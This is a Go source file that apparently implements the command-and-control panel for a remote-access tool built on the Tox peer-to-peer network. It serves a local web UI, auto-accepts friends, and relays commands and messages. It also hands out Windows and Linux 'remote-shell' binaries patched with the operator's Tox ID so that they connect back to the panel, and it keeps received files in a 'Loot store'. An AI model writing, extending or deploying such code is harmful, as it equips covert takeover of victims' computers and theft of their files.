// Command web runs the Tox client with a persistent identity and auto-accept,
// and serves a local HTTP API + web UI to see friends, read messages and reply.
//
//	go run ./web            then open http://127.0.0.1:8081
package main

import (
	"bytes"
	"context"
	"embed"
	"encoding/json"
	"flag"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"time"

	"toxnet/tox"
)

// Remote-shell binaries served by the Download button, baked into this
// executable so Toxnet is self-contained. build.bat populates web/assets.
//
//go:embed all:assets
var assets embed.FS

type logMsg struct {
	ID     uint64    `json:"id"`
	Friend uint32    `json:"friend"`
	Dir    string    `json:"dir"` // "in" or "out"
	Text   string    `json:"text"`
	Time   time.Time `json:"time"`
}

type server struct {
	tx   *tox.Tox
	name string
	db   *logStore // persistent activity log (may be nil if it failed to open)

	mu     sync.Mutex
	log    []logMsg
	nextID uint64
	ops    map[uint32]msgSink // in-flight remote request, per friend

	dldir   string            // where background downloads are saved
	jobs    map[string]*dlJob // download jobs by id
	jobList []string          // job ids in creation order (for pruning)
	cmdmu   map[uint32]*sync.Mutex
	dlSeq   uint64            // last download id handed out (guarded by mu)

	// File-transfer downloads (protocol path). awaiting holds jobs that asked a
	// friend to send a file and are waiting for its offer, oldest first; bound
	// holds accepted transfers keyed by friendFileKey(friend, fileNum).
	awaiting map[uint32][]*dlJob
	bound    map[uint64]*dlJob
}

const maxLog = 5000

func (s *server) add(friend uint32, dir, text string) {
	s.mu.Lock()
	s.nextID++
	s.log = append(s.log, logMsg{ID: s.nextID, Friend: friend, Dir: dir, Text: text, Time: time.Now()})
	if len(s.log) > maxLog {
		s.log = s.log[len(s.log)-maxLog:]
	}
	s.mu.Unlock()
	s.db.console(friend, s.tx.FriendPublicKey(friend), dir, text)
}

func (s *server) since(id uint64) []logMsg {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []logMsg
	for _, m := range s.log {
		if m.ID > id {
			out = append(out, m)
		}
	}
	return out
}

// ownerPlaceholder is the 76-byte placeholder baked into the Go remote binary
// (linux/); it is replaced with the web client's Tox ID at download time.
// It must match the placeholder in linux/main.go exactly.
const ownerPlaceholder = "TOXNET_OWNER_ID_PLACEHOLDER_000000000000000000000000000000000000000000000000"

// patchPlaceholder replaces the exact placeholder byte sequence with newID
// (same length). Used for the Go binary, whose owner Tox ID is a known marker.
func patchPlaceholder(data []byte, placeholder, newID string) ([]byte, bool) {
	if len(newID) != len(placeholder) {
		return nil, false
	}
	i := bytes.Index(data, []byte(placeholder))
	if i < 0 {
		return nil, false
	}
	out := make([]byte, len(data))
	copy(out, data)
	copy(out[i:i+len(placeholder)], newID)
	return out, true
}

// patchFriendID overwrites the 76-character Tox ID baked into remote.exe or
// remote.bin (its FRIEND_ID string) with newID. The ID is the only 76-char ASCII-hex run
// in the binary - bootstrap keys and crypto constants are stored as raw bytes,
// not hex text - so a single exact-length run identifies it unambiguously. The
// replacement is the same length, so nothing else shifts. Returns ok=false if
// it isn't found exactly once, in which case the caller serves the file as-is.
func patchFriendID(data []byte, newID string) ([]byte, bool) {
	if len(newID) != 76 {
		return nil, false
	}
	isHex := func(b byte) bool {
		return (b >= '0' && b <= '9') || (b >= 'A' && b <= 'F') || (b >= 'a' && b <= 'f')
	}
	var at []int
	for i := 0; i < len(data); {
		if !isHex(data[i]) {
			i++
			continue
		}
		j := i
		for j < len(data) && isHex(data[j]) {
			j++
		}
		if j-i == 76 {
			at = append(at, i)
		}
		i = j
	}
	if len(at) != 1 {
		return nil, false
	}
	out := make([]byte, len(data))
	copy(out, data)
	copy(out[at[0]:at[0]+76], newID)
	return out, true
}

func writeJSON(w http.ResponseWriter, v any) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(v)
}

func main() {
	addr := flag.String("addr", "127.0.0.1:8081", "HTTP listen address (keep it on localhost)")
	save := flag.String("save", "toxnet-data/toxnet.save", "identity + friends save file")
	name := flag.String("name", "toxnet-web", "our nickname")
	dlDir := flag.String("download-dir", "toxnet-data/downloads", "folder where received files are kept")
	dbPath := flag.String("db", "toxnet-data/toxnet.db", "SQLite activity log (friends, downloads, console)")
	flag.Parse()

	// Create the data directories (a toxnet-data/ folder by default) under the
	// run directory before anything opens the save or the database.
	for _, dir := range []string{filepath.Dir(*save), filepath.Dir(*dbPath), *dlDir} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			log.Fatal(err)
		}
	}

	tx, err := tox.New(tox.Options{Name: *name, SavePath: *save, AutoAccept: true})
	if err != nil {
		log.Fatal(err)
	}
	defer tx.Close()

	nodes, err := tox.FetchNodes(context.Background())
	if err != nil || len(nodes) == 0 {
		nodes = tox.DefaultNodes
	}
	if len(nodes) > 12 {
		nodes = nodes[:12]
	}
	tx.BootstrapAll(nodes)

	db, err := openLog(*dbPath)
	if err != nil {
		log.Printf("activity log disabled (%v)", err)
	} else {
		defer db.Close()
		log.Printf("activity log: %s", *dbPath)
	}
	s := &server{tx: tx, name: *name, db: db, ops: map[uint32]msgSink{}, jobs: map[string]*dlJob{},
		dldir: *dlDir, cmdmu: map[uint32]*sync.Mutex{},
		awaiting: map[uint32][]*dlJob{}, bound: map[uint64]*dlJob{}}
	s.dlSeq = maxDownloadID(*dlDir) // resume ids past any files already there
	s.restoreDownloads()            // re-list previously received files in the Loot store
	s.setupFileTransfer()
	go s.watchFriends()    // log new friends and connection changes
	go s.flushDownloads()  // persist download rows as they progress

	// Drain received messages: file-browser replies go to their pending op,
	// everything else to the console log.
	go func() {
		for {
			for _, m := range tx.ReceivedMessages() {
				if !s.routeToOp(m.Friend, m.Text) {
					s.add(m.Friend, "in", m.Text)
				}
			}
			time.Sleep(200 * time.Millisecond)
		}
	}()

	mux := http.NewServeMux()
	mux.HandleFunc("/api/self", func(w http.ResponseWriter, r *http.Request) {
		writeJSON(w, map[string]string{"address": tx.Address(), "name": s.name})
	})
	mux.HandleFunc("/api/friends", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			var body struct {
				ToxID string `json:"toxID"`
			}
			if json.NewDecoder(r.Body).Decode(&body) != nil {
				http.Error(w, "bad request", 400)
				return
			}
			num, err := tx.AddFriend(body.ToxID, "")
			if err != nil {
				http.Error(w, err.Error(), 400)
				return
			}
			writeJSON(w, map[string]uint32{"num": num})
			return
		}
		writeJSON(w, tx.Friends())
	})
	mux.HandleFunc("POST /api/friends/{num}/name", func(w http.ResponseWriter, r *http.Request) {
		num, err := strconv.ParseUint(r.PathValue("num"), 10, 32)
		if err != nil {
			http.Error(w, "bad friend number", 400)
			return
		}
		var body struct {
			Name string `json:"name"`
		}
		if json.NewDecoder(r.Body).Decode(&body) != nil {
			http.Error(w, "bad request", 400)
			return
		}
		if err := tx.SetFriendLocalName(uint32(num), body.Name); err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		writeJSON(w, map[string]bool{"ok": true})
	})
	mux.HandleFunc("POST /api/friends/{num}/note", func(w http.ResponseWriter, r *http.Request) {
		num, err := strconv.ParseUint(r.PathValue("num"), 10, 32)
		if err != nil {
			http.Error(w, "bad friend number", 400)
			return
		}
		var body struct {
			Note string `json:"note"`
		}
		if json.NewDecoder(r.Body).Decode(&body) != nil {
			http.Error(w, "bad request", 400)
			return
		}
		if err := tx.SetFriendNote(uint32(num), body.Note); err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		writeJSON(w, map[string]bool{"ok": true})
	})
	mux.HandleFunc("DELETE /api/friends/{num}", func(w http.ResponseWriter, r *http.Request) {
		num, err := strconv.ParseUint(r.PathValue("num"), 10, 32)
		if err != nil {
			http.Error(w, "bad friend number", 400)
			return
		}
		key := tx.FriendPublicKey(uint32(num))
		if err := tx.RemoveFriend(uint32(num)); err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		s.db.friendRemoved(uint32(num), key)
		writeJSON(w, map[string]bool{"ok": true})
	})
	mux.HandleFunc("/api/send", func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Friend uint32 `json:"friend"`
			Text   string `json:"text"`
		}
		if json.NewDecoder(r.Body).Decode(&body) != nil || body.Text == "" {
			http.Error(w, "bad request", 400)
			return
		}
		if err := tx.SendMessage(body.Friend, body.Text); err != nil {
			http.Error(w, err.Error(), 409)
			return
		}
		s.add(body.Friend, "out", body.Text)
		writeJSON(w, map[string]bool{"ok": true})
	})
	mux.HandleFunc("/api/messages", func(w http.ResponseWriter, r *http.Request) {
		since, _ := strconv.ParseUint(r.URL.Query().Get("since"), 10, 64)
		writeJSON(w, s.since(since))
	})
	// Serve a remote-shell binary, locked to THIS web client's Tox ID so it
	// connects back here as a friend and takes commands only from us.
	serveBinary := func(name string, patch func([]byte) ([]byte, bool)) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			data, err := assets.ReadFile("assets/" + name)
			if err != nil || len(data) == 0 {
				http.Error(w, name+" is not embedded in this build (run build.bat)", 404)
				return
			}
			if p, ok := patch(data); ok {
				data = p
			} else {
				log.Printf("download: could not set owner Tox ID in %s; serving as-built", name)
			}
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", `attachment; filename="`+name+`"`)
			w.Write(data)
		}
	}
	mux.HandleFunc("/download/toxnet-windows.exe", serveBinary("toxnet-windows.exe",
		func(d []byte) ([]byte, bool) { return patchFriendID(d, tx.Address()) }))
	mux.HandleFunc("/download/toxnet-windows.bin", serveBinary("toxnet-windows.bin",
		func(d []byte) ([]byte, bool) { return patchFriendID(d, tx.Address()) }))
	mux.HandleFunc("/download/toxnet-linux", serveBinary("toxnet-linux",
		func(d []byte) ([]byte, bool) { return patchPlaceholder(d, ownerPlaceholder, tx.Address()) }))
	s.registerFileRoutes(mux)
	s.registerLogRoutes(mux)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(indexHTML))
	})

	log.Printf("Tox ID: %s", tx.Address())
	log.Printf("web UI on http://%s", *addr)
	log.Fatal(http.ListenAndServe(*addr, mux))
}
